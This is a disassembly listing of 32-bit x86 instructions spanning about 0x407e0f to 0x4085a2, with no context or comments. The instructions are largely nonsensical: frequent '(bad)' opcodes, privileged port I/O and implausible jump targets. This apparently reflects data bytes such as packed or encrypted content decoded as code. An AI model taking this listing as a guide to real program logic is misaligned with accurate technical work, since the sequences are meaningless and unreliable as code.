  407e0f:	pop    eax
  407e10:	add    BYTE PTR [edi],al
  407e12:	(bad)  
  407e13:	int3   
  407e14:	mov    cs:0x8b5fbbee,al
  407e1a:	sub    bh,bh
  407e1c:	push   ebp
  407e1d:	or     al,0x7d
  407e1f:	adc    ah,BYTE PTR [eax+0x67643055]
  407e25:	(bad)
  407e28:	pop    ebp
  407e29:	jno    0x407e37
  407e2b:	push   0x60
  407e2d:	jmp    0x407e99
  407e2f:	push   ebp
  407e30:	sti    
  407e31:	and    BYTE PTR [edi+0x7e531684],cl
  407e37:	fsubp  st(7),st
  407e39:	test   al,0xab
  407e3b:	mov    edx,0x404d1ab5
  407e40:	add    al,0xb7
  407e42:	push   ss
  407e43:	call   0xe0442038
  407e48:	adc    eax,0x7f0d8bab
  407e4d:	pop    es
  407e4e:	test   BYTE PTR [edx],al
  407e50:	cdq    
  407e51:	inc    esi
  407e52:	gs jns 0x407e33
  407e55:	idiv   BYTE PTR [ecx-0x75da895e]
  407e5b:	pop    esi
  407e5c:	aam    0xec
  407e5e:	push   ebx
  407e5f:	scas   eax,DWORD PTR es:[edi]
  407e60:	test   al,0x46
  407e62:	aad    0xf
  407e64:	jle    0x407e6e
  407e66:	or     eax,0xf10022d4
  407e6b:	and    al,0xec
  407e6d:	sbb    eax,DWORD PTR [eax+0x5]
  407e70:	xor    esi,esp
  407e72:	bound  edx,QWORD PTR [edi+0x6c8969e9]
  407e78:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407e79:	lea    ebp,[edi+0x5690e192]
  407e7f:	add    esi,esi
  407e81:	or     eax,ebx
  407e83:	in     al,dx
  407e84:	adc    al,0xee
  407e86:	add    BYTE PTR [eax],bl
  407e88:	daa    
  407e89:	mov    ebp,0x300c2207
  407e8e:	repz les esp,FWORD PTR [eax]
  407e91:	xor    edx,DWORD PTR [ebx+eax*4+0x0]
  407e95:	cmc    
  407e96:	int    0x1b
  407e98:	or     al,BYTE PTR [edi+eiz*1-0x38]
  407e9c:	push   ebp
  407e9d:	mov    al,0xec
  407e9f:	mov    ebp,0xb171eff
  407ea4:	jle    0x407ec2
  407ea6:	push   esi
  407ea7:	pusha  
  407ea8:	(bad)  
  407ea9:	lahf   
  407eaa:	lock cmp DWORD PTR ds:0xfa558ee5,0xfffffffe
  407eb2:	add    BYTE PTR [eax+0x26],dh
  407eb5:	jb     0x407ebe
  407eb7:	push   es
  407eb8:	add    BYTE PTR [eax+0x76eab110],bl
  407ebe:	inc    edi
  407ebf:	adc    dh,BYTE PTR [esi-0x7fa32eae]
  407ec5:	sbb    al,0x7e
  407ec7:	dec    ebx
  407ec8:	(bad)  
  407ec9:	cmp    edi,DWORD PTR [ecx-0x2a]
  407ecc:	jle    0x407eae
  407ece:	pusha  
  407ecf:	mov    eax,ds:0x50edcd3c
  407ed4:	popa   
  407ed5:	and    DWORD PTR [ecx-0x5],ecx
  407ed8:	pushf  
  407ed9:	sub    al,0x1c
  407edb:	push   cs
  407edc:	(bad)  
  407edd:	or     eax,0xfc23bf6
  407ee2:	lahf   
  407ee3:	cmp    BYTE PTR [esi],ah
  407ee5:	and    BYTE PTR [ebx+0x6756b884],cl
  407eeb:	xor    al,0xc6
  407eed:	mov    al,ds:0xec530ace
  407ef2:	jne    0x407f19
  407ef4:	pop    es
  407ef5:	test   BYTE PTR [ebp+0x64],ah
  407ef8:	jo     0x407eda
  407efa:	adc    DWORD PTR [bp+di+0x2],eax
  407efe:	pusha  
  407eff:	leave  
  407f00:	push   ecx
  407f01:	fwait
  407f02:	in     al,0x21
  407f04:	sub    esp,eax
  407f06:	fistp  WORD PTR [eax+0x49]
  407f09:	sbb    dh,0xc9
  407f0c:	jbe    0x407f01
  407f0e:	fst    QWORD PTR [eax]
  407f10:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407f11:	mov    al,ds:0x1b4175b8
  407f16:	cwde   
  407f17:	in     al,dx
  407f18:	mov    ebp,0xb911f0dc
  407f1d:	adc    eax,0x64790c7e
  407f22:	cld    
  407f23:	inc    ebx
  407f24:	adc    BYTE PTR [ecx],bh
  407f26:	(bad)  
  407f27:	or     al,0x28
  407f29:	leave  
  407f2a:	dec    ebx
  407f2b:	and    dh,BYTE PTR [ebp-0x20]
  407f2e:	out    0xde,al
  407f30:	xchg   edx,eax
  407f31:	cmp    al,0x2c
  407f33:	pop    ss
  407f34:	loope  0x407ebf
  407f36:	ja     0x407f39
  407f38:	jae    0x407fb3
  407f3a:	cs mov ah,0xaa
  407f3d:	ret    
  407f3e:	cmp    bl,ah
  407f40:	mov    ds:0x70a324c3,eax
  407f45:	xlat   BYTE PTR ds:[ebx]
  407f46:	mov    bl,0xeb
  407f48:	push   ss
  407f49:	or     BYTE PTR [ecx],cl
  407f4b:	ror    BYTE PTR [esp+ecx*1-0x40],0xbf
  407f50:	pop    esp
  407f51:	mov    DWORD PTR [edx+eiz*1-0x8],ebx
  407f55:	push   cs
  407f56:	pushf  
  407f57:	unpcklps xmm1,XMMWORD PTR [edi+eax*8+0x10]
  407f5c:	xchg   ecx,eax
  407f5d:	iret   
  407f5e:	scas   al,BYTE PTR es:[edi]
  407f5f:	lock ins BYTE PTR es:[edi],dx
  407f61:	fisttp WORD PTR [ecx+ebx*8]
  407f64:	fadd   DWORD PTR [esi-0x64]
  407f67:	enter  0xc8e7,0xd8
  407f6b:	retf   0x1938
  407f6e:	mov    ah,0xcd
  407f70:	fs dec eax
  407f72:	cmp    al,0x31
  407f74:	or     DWORD PTR [ebp-0x1c],esp
  407f77:	aam    0x84
  407f79:	rcr    BYTE PTR [ebx],0x48
  407f7c:	inc    esp
  407f7d:	inc    eax
  407f7e:	pop    esi
  407f7f:	push   ss
  407f80:	pop    ds
  407f81:	loope  0x407f13
  407f83:	inc    ecx
  407f84:	ds push edi
  407f86:	adc    edx,DWORD PTR [esi]
  407f88:	stos   BYTE PTR es:[edi],al
  407f89:	xchg   esp,eax
  407f8a:	pop    es
  407f8b:	stos   DWORD PTR es:[edi],eax
  407f8c:	push   es
  407f8d:	sbb    DWORD PTR [eax+edx*4-0x54],esp
  407f91:	lods   eax,DWORD PTR ds:[esi]
  407f92:	scas   al,BYTE PTR es:[edi]
  407f93:	scas   eax,DWORD PTR es:[edi]
  407f94:	sbb    DWORD PTR [eax+edx*4+0x41],esp
  407f98:	nop
  407f99:	xchg   ecx,eax
  407f9a:	xchg   edx,eax
  407f9b:	fs nop
  407f9d:	inc    ecx
  407f9e:	push   es
  407f9f:	xchg   ebx,eax
  407fa0:	xchg   esp,eax
  407fa1:	xchg   ebp,eax
  407fa2:	leave  
  407fa3:	leave  
  407fa4:	and    bl,BYTE PTR [esi]
  407fa6:	xchg   esi,eax
  407fa7:	inc    DWORD PTR [eax]
  407fa9:	mov    bh,0xe2
  407fab:	and    DWORD PTR ds:0x58392f24,ebp
  407fb1:	cmp    dl,ah
  407fb3:	sub    BYTE PTR [esi],bl
  407fb5:	test   BYTE PTR [eax+eax*1+0x10d7fb1a],al
  407fbc:	add    ecx,DWORD PTR [eax]
  407fbe:	add    edi,esi
  407fc0:	add    DWORD PTR [edi],eax
  407fc2:	in     al,0xb2
  407fc4:	pop    ecx
  407fc5:	outs   dx,DWORD PTR ds:[esi]
  407fc6:	arpl   WORD PTR [esi-0xbb98ac4],sp
  407fcc:	nop
  407fcd:	xchg   DWORD PTR [edi],ebx
  407fcf:	mov    ebx,0xd784438c
  407fd4:	mov    esp,0x77420a8c
  407fd9:	loop   0x407f88
  407fdb:	enter  0xb765,0x85
  407fdf:	ds add ebx,eax
  407fe2:	mov    ebx,0x81c94cdd
  407fe7:	or     al,0x40
  407fe9:	in     al,0x40
  407feb:	add    DWORD PTR [edx-0x1cdceeb3],eax
  407ff1:	cmp    al,0x7b
  407ff3:	and    BYTE PTR ds:0x3ce32272,al
  407ff9:	xchg   BYTE PTR ds:0x7ca5e16c,dl
  407fff:	ins    DWORD PTR es:[edi],dx
  408000:	mov    bh,0x2a
  408002:	pusha  
  408003:	sub    cl,bl
  408005:	pop    ebx
  408006:	cwde   
  408007:	cwde   
  408008:	add    eax,0x5747254c
  40800d:	loop   0x407fff
  40800f:	inc    esi
  408010:	mov    eax,ds:0x4d4aca64
  408015:	pop    edi
  408016:	clc    
  408017:	sub    BYTE PTR [edi-0x37],al
  40801a:	xchg   ebx,eax
  40801b:	clc    
  40801c:	jecxz  0x40806a
  40801e:	or     eax,0x832c2b72
  408023:	inc    eax
  408024:	pop    ds
  408025:	pop    ebx
  408026:	in     al,0x54
  408028:	in     eax,0x8
  40802a:	in     al,0x45
  40802c:	in     al,0x54
  40802e:	or     esp,DWORD PTR ds:0x4fd0ac5d
  408034:	jo     0x408022
  408036:	pop    ecx
  408037:	push   edi
  408038:	lods   al,BYTE PTR ds:[esi]
  408039:	and    eax,DWORD PTR [edi+0x20]
  40803c:	or     al,0xac
  40803e:	adc    ecx,DWORD PTR [ebx]
  408040:	jb     0x40808a
  408042:	and    al,0x60
  408045:	push   edi
  408046:	in     eax,0x4
  408048:	test   eax,0xe59e792a
  40804e:	add    al,0xc
  408050:	in     al,0x74
  408052:	(bad)  
  408053:	loop   0x4080a5
  408055:	mov    esi,0x6d5c570b
  40805a:	add    al,0x32
  40805c:	xchg   esp,eax
  40805d:	pop    esp
  40805e:	scas   eax,DWORD PTR es:[edi]
  40805f:	in     al,0xb0
  408061:	inc    edi
  408062:	add    DWORD PTR [ecx],ecx
  408064:	scas   eax,DWORD PTR es:[edi]
  408065:	mov    ah,0xdb
  408067:	or     BYTE PTR [ecx+eiz*4+0x4caf77b4],cl
  40806e:	or     DWORD PTR [eax],edx
  408070:	cmp    al,0xe4
  408072:	imul   esi,DWORD PTR [ebx+0x74],0x42cb0ce6
  408079:	sub    DWORD PTR [eax+0x750ce613],edx
  40807f:	xchg   edx,eax
  408080:	in     eax,dx
  408081:	xchg   ecx,eax
  408082:	ins    BYTE PTR es:[edi],dx
  408083:	pop    ebp
  408084:	jae    0x4080e5
  408086:	ins    BYTE PTR es:[edi],dx
  408087:	or     BYTE PTR [esi+0x116c8640],cl
  40808d:	and    BYTE PTR [eax-0x3a987370],0x87
  408094:	xchg   edx,eax
  408095:	int    0x71
  408097:	hlt    
  408098:	ja     0x4080f9
  40809a:	int3   
  40809b:	fcom   QWORD PTR [eax]
  40809d:	jbe    0x4080a6
  40809f:	pusha  
  4080a0:	adc    eax,0xf247f0ab
  4080a5:	push   eax
  4080a6:	mov    edi,0x1fd9b777
  4080ab:	repz icebp 
  4080ad:	and    BYTE PTR [ebx],al
  4080af:	pushf  
  4080b0:	add    eax,0xe763c954
  4080b5:	xor    dl,dh
  4080b7:	inc    esp
  4080b8:	push   esi
  4080b9:	add    ebx,ecx
  4080bb:	out    0x30,eax
  4080bd:	and    al,0xdd
  4080bf:	fwait
  4080c0:	jl     0x4080c2
  4080c2:	repz enter 0x590b,0x37
  4080c7:	mov    BYTE PTR [esi+ebx*2+0x36],ch
  4080cb:	fs inc edi
  4080cd:	mov    ah,0x57
  4080cf:	out    0x94,eax
  4080d1:	mov    ds:0x4edcd704,al
  4080d6:	xor    ch,0x3c
  4080d9:	add    esi,esi
  4080db:	dec    esp
  4080dc:	push   esp
  4080dd:	or     esi,DWORD PTR [ebx+0x2b]
  4080e0:	gs pusha 
  4080e2:	push   0x11884102
  4080e7:	test   DWORD PTR [eax],0x5b0b7256
  4080ed:	pop    eax
  4080ee:	jno    0x408140
  4080f0:	sub    eax,0xcb516e73
  4080f5:	retf   
  4080f6:	pusha  
  4080f7:	add    edi,DWORD PTR [ebx-0x4c]
  4080fa:	pop    es
  4080fb:	adc    al,BYTE PTR [eax+eiz*2-0x7dabfdf9]
  408102:	loopne 0x408147
  408104:	ins    BYTE PTR es:[edi],dx
  408105:	popa   
  408106:	mov    esi,DWORD PTR [edi]
  408108:	push   0xe70fc27f
  40810d:	fmul   QWORD PTR [edi]
  40810f:	cmovns edx,eax
  408112:	jae    0x408155
  408114:	fs popa 
  408116:	jo     0x408144
  408118:	fdivr  st,st(7)
  40811a:	inc    DWORD PTR [esi]
  40811c:	aaa    
  40811d:	add    BYTE PTR [ecx],0x34
  408120:	das    
  408121:	pushf  
  408122:	jae    0x408110
  408124:	push   edx
  408125:	rcl    BYTE PTR [ecx],1
  408127:	sahf   
  408128:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408129:	add    BYTE PTR [eax],ah
  40812b:	scas   eax,DWORD PTR es:[edi]
  40812c:	cmp    eax,0x6036da82
  408131:	sbb    edi,DWORD PTR [eax+0x6f]
  408134:	jne    0x408195
  408136:	jle    0x408120
  408138:	outs   dx,DWORD PTR ds:[esi]
  408139:	ret    
  40813a:	neg    DWORD PTR [ebx+0x76]
  40813d:	in     al,dx
  40813e:	call   0x2029911f
  408143:	(bad)  
  408144:	psubw  mm4,QWORD PTR [ecx]
  408147:	pop    edi
  408148:	retf   
  408149:	xchg   ebx,eax
  40814a:	pop    ss
  40814b:	fnstcw WORD PTR [ebx+edx*8]
  40814e:	test   DWORD PTR [ecx+edi*8],0xd832f844
  408155:	xor    DWORD PTR [eax-0x3704e0c4],esp
  40815b:	pop    es
  40815c:	ror    ch,1
  40815e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40815f:	jmp    0x408143
  408161:	cld    
  408162:	sub    BYTE PTR [ecx-0x3c],ch
  408165:	add    edi,eax
  408167:	add    ah,BYTE PTR [eax-0x18]
  40816a:	dec    ebp
  40816b:	xlat   BYTE PTR ds:[ebx]
  40816c:	pop    ebp
  40816d:	add    ebp,DWORD PTR cs:[eax+0x3c3b3004]
  408174:	add    esp,DWORD PTR [eax-0x7c]
  408177:	mov    bh,0xee
  408179:	fs inc eax
  40817b:	pop    ebx
  40817c:	cli    
  40817d:	loopne 0x4081b6
  40817f:	aam    0x3
  408181:	std    
  408182:	push   eax
  408183:	outs   dx,BYTE PTR ds:[esi]
  408184:	ja     0x40813c
  408186:	xor    edx,DWORD PTR [edi-0x1e84f02]
  40818c:	outs   dx,DWORD PTR ds:[esi]
  40818d:	call   DWORD PTR [ebx+eax*1]
  408190:	inc    ecx
  408191:	xlat   BYTE PTR ds:[ebx]
  408192:	pop    esp
  408193:	mov    edx,0x1144b68
  408198:	lods   al,BYTE PTR ds:[esi]
  408199:	add    al,0x3
  40819b:	cwde   
  40819c:	loope  0x408190
  40819e:	add    BYTE PTR [ebp-0x3d],0xe7
  4081a2:	fmul   DWORD PTR [eax+ecx*1]
  4081a5:	push   esp
  4081a6:	adc    bl,ch
  4081a8:	xchg   edx,eax
  4081a9:	in     eax,dx
  4081aa:	push   es
  4081ab:	nop
  4081ac:	(bad)  
  4081ad:	cld    
  4081ae:	pop    es
  4081af:	push   cs
  4081b0:	or     eax,0xfec235c
  4081b5:	add    esp,DWORD PTR [ecx-0x16f4bb50]
  4081bb:	and    BYTE PTR [esi],cl
  4081bd:	or     esp,DWORD PTR [ebx]
  4081bf:	mov    ds:0x49185d92,al
  4081c4:	aas    
  4081c5:	ins    DWORD PTR es:[edi],dx
  4081c6:	or     BYTE PTR [esi+0x1],cl
  4081c9:	imul   edi,DWORD PTR [eax+0x1fe93f2c],0x660719cf
  4081d3:	sub    dl,0xfa
  4081d6:	(bad)  
  4081d8:	jl     0x4081e3
  4081da:	jns    0x4081fe
  4081dc:	loope  0x4081c6
  4081de:	adc    BYTE PTR [edi],ch
  4081e0:	add    DWORD PTR [eax+esi*2],eax
  4081e3:	dec    edi
  4081e4:	push   0x701ee9a
  4081e9:	sbb    BYTE PTR [ebx],al
  4081eb:	dec    esp
  4081ec:	push   eax
  4081ed:	push   esp
  4081ee:	das    
  4081ef:	or     al,cl
  4081f1:	in     eax,dx
  4081f2:	dec    esi
  4081f3:	push   0x2409036e
  4081f8:	clc    
  4081f9:	das    
  4081fa:	or     ch,bh
  4081fc:	or     cl,BYTE PTR [eax-0x28bdc22e]
  408202:	cmp    ecx,esp
  408204:	add    ebx,eax
  408206:	das    
  408207:	add    DWORD PTR ds:0x6db40374,eax
  40820d:	dec    ecx
  40820e:	push   ds
  40820f:	loope  0x408217
  408211:	and    BYTE PTR [edi],ch
  408213:	add    DWORD PTR [edi],eax
  408215:	mov    al,0xb
  408217:	in     al,dx
  408218:	jbe    0x408288
  40821a:	test   al,dl
  40821c:	add    edi,esp
  40821e:	das    
  40821f:	aaa    
  408220:	ja     0x408227
  408222:	pop    eax
  408223:	adc    BYTE PTR [edx+0x7367e76e],bh
  408229:	push   es
  40822a:	mov    al,ds:0x5003405b
  40822f:	add    dh,bh
  408231:	ret    0xc7be
  408234:	repz fild WORD PTR [edi]
  408237:	adc    cl,ch
  408239:	mov    esp,ds
  40823b:	mov    esp,DWORD PTR [ebx+edx*2-0x158007ba]
  408242:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408243:	jae    0x4082a2
  408245:	imul   eax,DWORD PTR [ecx],0xffffffd2
  408248:	jmp    0x6bc4:0x83371bc0
  40824f:	leave  
  408250:	push   0x100b036e
  408255:	adc    al,0xf
  408257:	or     esp,ebx
  408259:	mov    ecx,0xcb0a24d
  40825e:	cmp    BYTE PTR [ecx],bl
  408260:	and    ebp,DWORD PTR [edi-0x15]
  408263:	adc    al,0x0
  408265:	cmp    edi,ebx
  408267:	and    ch,bl
  408269:	xor    BYTE PTR [eax],cl
  40826b:	ja     0x4082c5
  40826d:	outs   dx,DWORD PTR ds:[esi]
  40826e:	addr16 dec ebp
  408270:	sar    DWORD PTR [ebp+0x7c03680d],cl
  408276:	sbb    al,0x2c
  408278:	outs   dx,DWORD PTR ds:[esi]
  408279:	or     eax,0x12e228d1
  40827e:	aaa    
  40827f:	push   esp
  408280:	dec    eax
  408281:	popa   
  408282:	xchg   esp,eax
  408283:	ins    BYTE PTR es:[edi],dx
  408284:	mov    fs,WORD PTR [ecx]
  408286:	cdq    
  408287:	and    esi,DWORD PTR [edi-0x74]
  40828a:	cmp    DWORD PTR [ecx-0x3757cdf4],edx
  408290:	add    DWORD PTR [edi],ecx
  408292:	sub    eax,0x7222428b
  408297:	movzx  esp,WORD PTR [ebp-0x47ac205a]
  40829e:	push   cs
  40829f:	push   cs
  4082a0:	push   esp
  4082a1:	dec    ecx
  4082a2:	dec    BYTE PTR fs:[ebp-0x28]
  4082a6:	inc    ebp
  4082a7:	add    eax,0x85c7972
  4082ac:	sbb    DWORD PTR [edi+eiz*8],edx
  4082af:	jg     0x40829d
  4082b1:	and    al,0x4f
  4082b3:	cmp    BYTE PTR [ecx+edx*4-0x14],0x24
  4082b8:	adc    al,0xed
  4082ba:	add    al,0x9
  4082bc:	out    0x6e,al
  4082be:	jo     0x408249
  4082c0:	push   esp
  4082c1:	pop    ds
  4082c2:	addr16 inc edi
  4082c4:	pcmpeqw mm6,QWORD PTR [eax-0x11]
  4082c8:	push   edi
  4082c9:	or     DWORD PTR [eax+0x7c7cc943],edx
  4082cf:	and    al,0xc5
  4082d1:	sbb    DWORD PTR [edx+0xa7ceee4],0x73
  4082d8:	dec    edi
  4082d9:	rcl    dh,0x43
  4082dc:	push   ss
  4082dd:	aam    0xf9
  4082df:	mov    BYTE PTR [ebp-0x6f],dl
  4082e2:	fdivr  st,st(5)
  4082e4:	and    cl,dh
  4082e6:	inc    esi
  4082e7:	repz ret 
  4082e9:	arpl   si,sp
  4082eb:	or     BYTE PTR [esi+0xb8a8815],0x77
  4082f2:	push   cs
  4082f3:	jmp    0xb071c438
  4082f8:	inc    ecx
  4082f9:	or     BYTE PTR ds:0x740119b5,bl
  4082ff:	fmul   DWORD PTR [ebx+edi*1]
  408302:	dec    ebx
  408303:	xchg   esp,eax
  408304:	adc    eax,esi
  408306:	stos   BYTE PTR es:[edi],al
  408307:	ds enter 0xc2f0,0x8
  40830c:	cwde   
  40830d:	aad    0xc3
  40830f:	xchg   ecx,eax
  408310:	repz jl 0x40831a
  408313:	inc    esi
  408314:	inc    eax
  408315:	in     al,dx
  408316:	add    al,0x7
  408318:	dec    eax
  408319:	gs add al,0xc
  40831c:	mov    dl,0x8
  40831e:	or     al,0xea
  408320:	adc    BYTE PTR [ecx+ecx*1],cl
  408323:	bound  esi,QWORD PTR [edi]
  408325:	sbb    DWORD PTR [ebp+0x1f],edx
  408328:	xor    esp,DWORD PTR [eax+0x3ba43b16]
  40832e:	fmul   DWORD PTR ds:0x6082c96a
  408334:	push   ebx
  408335:	aas    
  408336:	ficom  DWORD PTR [edi]
  408338:	xchg   esp,eax
  408339:	mov    BYTE PTR ds:0x5b672531,al
  40833f:	and    BYTE PTR [ebx-0x31],0x4d
  408343:	repnz and al,0xa4
  408346:	in     eax,dx
  408347:	inc    eax
  408348:	jecxz  0x408354
  40834a:	adc    al,0x30
  40834c:	test   DWORD PTR ds:0x3e34f10f,0x263080db
  408356:	in     al,0x0
  408358:	cdq    
  408359:	add    al,0x4
  40835b:	or     BYTE PTR [edi-0x47dd65eb],dl
  408361:	adc    al,0x34
  408363:	xor    al,0x8
  408365:	mov    cl,0x90
  408367:	jne    0x408379
  408369:	std    
  40836a:	sbb    BYTE PTR [esp+edx*1],dh
  40836d:	sbb    BYTE PTR [edx],al
  40836f:	adc    eax,0xcb3448b3
  408374:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408375:	loope  0x408339
  408377:	or     ch,BYTE PTR [eax+edi*8+0x78]
  40837b:	(bad)  
  40837c:	sbb    al,0xab
  40837e:	(bad)  
  40837f:	scas   eax,DWORD PTR es:[edi]
  408380:	inc    edi
  408381:	add    al,0x8d
  408383:	inc    edi
  408384:	push   ds
  408385:	ror    BYTE PTR [ebx-0x38c91ef3],0x1e
  40838c:	add    eax,0xecd8eb1d
  408391:	test   ah,ah
  408393:	push   esp
  408394:	jl     0x408331
  408396:	push   esp
  408397:	add    BYTE PTR [esi-0x3a],0x46
  40839b:	adc    BYTE PTR [ecx],al
  40839d:	ret    0x582c
  4083a0:	popa   
  4083a1:	retf   0x792b
  4083a4:	dec    DWORD PTR [esi]
  4083a6:	mov    al,0x4d
  4083a8:	lea    edx,[eax+edx*2+0x868f5f9]
  4083af:	dec    ebp
  4083b0:	test   DWORD PTR [edi],ebx
  4083b2:	and    esi,esi
  4083b4:	std    
  4083b5:	in     eax,dx
  4083b6:	jl     0x4083ce
  4083b8:	inc    ebp
  4083b9:	xor    edi,edi
  4083bb:	or     eax,0x477bf7d7
  4083c0:	dec    ebp
  4083c1:	jne    0x4083b0
  4083c3:	or     BYTE PTR [ecx],al
  4083c5:	and    DWORD PTR [ecx],ecx
  4083c7:	xchg   edi,eax
  4083c8:	stos   DWORD PTR es:[edi],eax
  4083c9:	xchg   ebx,eax
  4083ca:	addr16 inc edi
  4083cc:	or     cl,BYTE PTR [eax]
  4083ce:	pop    DWORD PTR [ebx-0xf57b140]
  4083d4:	sbb    al,0x30
  4083d6:	jae    0x4083b3
  4083d8:	or     ecx,DWORD PTR [ebp+0x270937e7]
  4083de:	inc    esp
  4083df:	and    eax,DWORD PTR [edi+0x5b]
  4083e2:	xor    eax,0xbac70d0b
  4083e7:	fcom   st(3)
  4083e9:	arpl   WORD PTR [edi+0x60ed46d5],di
  4083ef:	mov    al,BYTE PTR [ebx-0x5aeb3322]
  4083f5:	js     0x40844c
  4083f7:	jne    0x408466
  4083f9:	and    al,0x3
  4083fb:	mov    ds:0xcb6b12e8,eax
  408400:	repz lds ebp,FWORD PTR [esi]
  408403:	retf   0x2304
  408406:	loopne 0x4083f6
  408408:	aam    0x35
  40840a:	fldenv [eax]
  40840c:	and    ebx,ebx
  40840e:	out    dx,eax
  40840f:	rcr    DWORD PTR [ecx],cl
  408411:	in     al,dx
  408412:	or     DWORD PTR [esi],esp
  408414:	cmp    esp,DWORD PTR [eax-0x66]
  408417:	out    dx,eax
  408418:	mov    DWORD PTR [esi],edx
  40841a:	loopne 0x40843d
  40841c:	test   BYTE PTR [edx+0x180b0446],bh
  408422:	fmul   DWORD PTR [ebx]
  408424:	stos   BYTE PTR es:[edi],al
  408425:	add    al,0xc8
  408427:	mov    ebp,edi
  408429:	fcom   DWORD PTR [esi]
  40842b:	add    eax,0x98b0366
  408430:	dec    esi
  408431:	xor    BYTE PTR [eax],dl
  408433:	fmul   QWORD PTR [ebx-0x69245c01]
  408439:	fild   DWORD PTR gs:[ecx-0x4a]
  40843d:	dec    ebp
  40843e:	or     al,0x5
  408440:	or     BYTE PTR [eax],cl
  408442:	or     al,0x4
  408444:	lods   al,BYTE PTR ds:[esi]
  408445:	add    al,0x88
  408447:	fldcw  WORD PTR [ecx]
  408449:	sub    eax,DWORD PTR [edx+0x10973319]
  40844f:	fwait
  408450:	out    dx,eax
  408451:	retf   
  408452:	out    dx,eax
  408453:	mov    edi,gs
  408455:	loopne 0x4083e2
  408457:	sar    BYTE PTR [edi+0x2340f450],1
  40845d:	inc    ebp
  40845e:	pushf  
  40845f:	xchg   edx,eax
  408460:	mov    ebx,0xca75fabf
  408465:	lock add eax,0x2318088a
  40846b:	inc    esi
  40846c:	lea    ebx,[ecx-0x45]
  40846f:	sub    BYTE PTR ds:0x5c76be88,bh
  408475:	outs   dx,BYTE PTR ds:[esi]
  408476:	or     eax,0x8efb7e14
  40847b:	jle    0x4084c8
  40847d:	cld    
  40847e:	mov    DWORD PTR [edx],ecx
  408480:	jmp    0x40840e
  408482:	ret    
  408483:	or     BYTE PTR [esi+0x75],cl
  408486:	loope  0x40849b
  408488:	xor    al,0x8c
  40848a:	or     BYTE PTR [esi+0x3a],al
  40848d:	ret    
  40848e:	add    ebp,esi
  408490:	in     al,dx
  408491:	inc    eax
  408492:	sub    DWORD PTR [ecx+0x1e],eax
  408495:	inc    esi
  408496:	mov    eax,ds:0x6cbfc708
  40849b:	cmp    eax,DWORD PTR [ebx]
  40849d:	jne    0x4084af
  40849f:	mov    BYTE PTR [ebp-0x5],0x4a
  4084a3:	dec    esp
  4084a4:	aad    0x8d
  4084a6:	jne    0x40846d
  4084a8:	loop   0x4084b4
  4084aa:	cmp    al,0xe6
  4084ac:	adc    eax,0x230e0800
  4084b1:	pop    edx
  4084b2:	inc    ebx
  4084b3:	mov    esi,0x34f48590
  4084b8:	xor    BYTE PTR [ebx-0x5255f7f8],bh
  4084be:	pop    es
  4084bf:	add    DWORD PTR [edx+0x3b0873d7],eax
  4084c5:	push   ds
  4084c6:	pop    es
  4084c7:	icebp  
  4084c8:	push   esp
  4084c9:	shl    BYTE PTR [ebp+0x6],1
  4084cc:	call   DWORD PTR [edx]
  4084ce:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4084cf:	js     0x4084d4
  4084d1:	stos   BYTE PTR es:[edi],al
  4084d2:	jne    0x408510
  4084d4:	mov    al,0xff
  4084d6:	inc    eax
  4084d7:	inc    esp
  4084d8:	or     esi,DWORD PTR [ebx]
  4084da:	leave  
  4084db:	sbb    ah,al
  4084dd:	push   ss
  4084de:	mov    WORD PTR [esi+0x49e7c645],ds
  4084e4:	xchg   DWORD PTR [ebp-0x30d7f54],ebx
  4084ea:	or     al,al
  4084ec:	rcl    DWORD PTR [ebx],cl
  4084ee:	mov    esp,0xa5198775
  4084f3:	add    eax,0xf7c084c
  4084f8:	fisub  WORD PTR [edx-0x133b9418]
  4084fe:	fsubp  st(6),st
  408500:	icebp  
  408501:	imul   edx,DWORD PTR [eax],0x7f
  408504:	int3   
  408505:	xor    eax,0x4bfff851
  40850a:	std    
  40850b:	jno    0x4084fc
  40850d:	ja     0x408502
  40850f:	jg     0x408501
  408511:	jge    0x40852c
  408513:	sub    eax,esi
  408515:	mov    ecx,eax
  408517:	shl    ecx,0x2
  40851a:	lea    edx,[eax+esi*4]
  40851d:	add    eax,0x38d1b044
  408522:	inc    esi
  408523:	xchg   edx,eax
  408524:	fistp  WORD PTR [ebx]
  408526:	mov    al,0x7a
  408528:	mov    cl,0x2
  40852a:	pop    ecx
  40852b:	inc    ebp
  40852c:	add    al,0xf0
  40852e:	xlat   BYTE PTR ds:[ebx]
  40852f:	into   
  408530:	mov    bl,BYTE PTR [edi-0xf]
  408533:	iret   
  408534:	push   edx
  408535:	xchg   esp,eax
  408536:	push   eax
  408537:	mov    DWORD PTR [eax+0x1],ebp
  40853a:	test   al,0x50
  40853c:	jns    0x408540
  40853e:	or     BYTE PTR [eax+0x62093056],ah
  408544:	xchg   ebx,eax
  408545:	adc    BYTE PTR [ecx+0x46],ah
  408548:	mov    esi,0xe8e9e5b9
  40854d:	int    0x0
  40854f:	mov    bh,BYTE PTR [ebx]
  408551:	fistp  QWORD PTR [ecx]
  408553:	push   es
  408554:	add    eax,0xf2120319
  408559:	sbb    bl,BYTE PTR [esi]
  40855b:	rol    BYTE PTR [edi],cl
  40855d:	jno    0x4085a6
  40855f:	mov    eax,ds:0x98f1d5ce
  408564:	cmp    BYTE PTR [esp+ebp*4+0x23f20422],0x2e
  40856c:	sbb    al,0x64
  40856e:	outs   dx,BYTE PTR ds:[esi]
  40856f:	dec    esi
  408570:	out    dx,al
  408571:	inc    ebx
  408572:	das    
  408573:	add    al,0xb0
  408575:	pop    ss
  408576:	mov    al,ds:0x508b7d2e
  40857b:	ss cli 
  40857d:	inc    eax
  40857e:	retf   0x85ca
  408581:	push   eax
  408582:	je     0x408587
  408584:	or     cl,0x74
  408587:	rol    DWORD PTR [ebx],0xfd
  40858a:	pop    eax
  40858b:	fsubr  DWORD PTR [esi]
  40858d:	xchg   ebp,eax
  40858e:	jmp    0x4085a1
  408590:	adc    cl,BYTE PTR [eax]
  408592:	mov    BYTE PTR [ecx+0x5605ebbb],bh
  408598:	test   BYTE PTR [edi],bh
  40859a:	add    eax,0x8bca0323
  40859f:	ror    DWORD PTR [edx+0x7],1
  4085a2:	push   ebp
